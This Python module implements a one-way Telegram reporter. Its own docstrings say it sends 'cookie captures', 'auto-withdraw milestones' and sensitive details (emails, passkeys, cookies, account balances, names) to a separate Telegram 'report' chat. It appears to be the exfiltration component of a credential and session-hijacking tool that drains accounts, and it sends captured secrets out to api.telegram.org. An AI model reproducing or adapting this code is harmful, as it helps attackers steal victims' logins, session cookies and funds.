"""Telegram helpers: one-way logging only.

Two separate channels are used:
  - log chat:      what happened (step changes, code submissions, cookie
                   captures, keep-open events, auto-withdraw milestones)
  - report chat:   sensitive details (email, passkey, cookies, balance, name)

Telegram is never used interactively - no prompts, no credential polling.
"""

import json
import os
import time
import urllib.parse
import urllib.request

MAX_MSG = 3800


def mask(value, field):
    if field == "email":
        name, sep, domain = value.partition("@")
        if not sep:
            return "*" * len(value)
        return f"{name[:2]}{'*' * max(1, len(name) - 2)}@{domain}"
    if field == "code":
        return f"{'*' * max(1, len(value) - 2)}{value[-2:]}"
    return "*" * max(4, len(value))


class TelegramClient:
    def __init__(self, token):
        self.api = f"https://api.telegram.org/bot{token}"

    def api_call(self, method, **params):
        url = f"{self.api}/{method}"
        data = urllib.parse.urlencode(params).encode()
        req = urllib.request.Request(url, data=data)
        with urllib.request.urlopen(req, timeout=90) as resp:
            return json.loads(resp.read().decode())

    def send(self, chat_id, text):
        try:
            self.api_call("sendMessage", chat_id=chat_id, text=text)
            return True
        except Exception as exc:
            print(f"[telegram] could not send to {chat_id}: {exc}")
            return False


class Reporter:
    """One-way Telegram logger with two channels: logs and details reports."""

    def __init__(self, token, log_chat_id=None, report_chat_id=None):
        self.client = TelegramClient(token)
        self.log_chat_id = (log_chat_id or "").strip() or None
        self.report_chat_id = (report_chat_id or "").strip() or None

    def _send(self, chat_id, label, text):
        if not chat_id:
            print(f"[tg:{label}] no chat id configured - message not sent:\n{text[:300]}")
            return False
        for i in range(0, len(text), MAX_MSG):
            self.client.send(chat_id, text[i : i + MAX_MSG])
        return True

    def log(self, text):
        """Sends a progress log line to the log channel."""
        print(f"[tg:log] {text[:120]}")
        return self._send(self.log_chat_id, "log", text)

    def report(self, text):
        """Sends sensitive details (creds / passkey / cookies / balance) to the report channel."""
        print(f"[tg:report] {text[:120]}")
        return self._send(self.report_chat_id, "report", text)
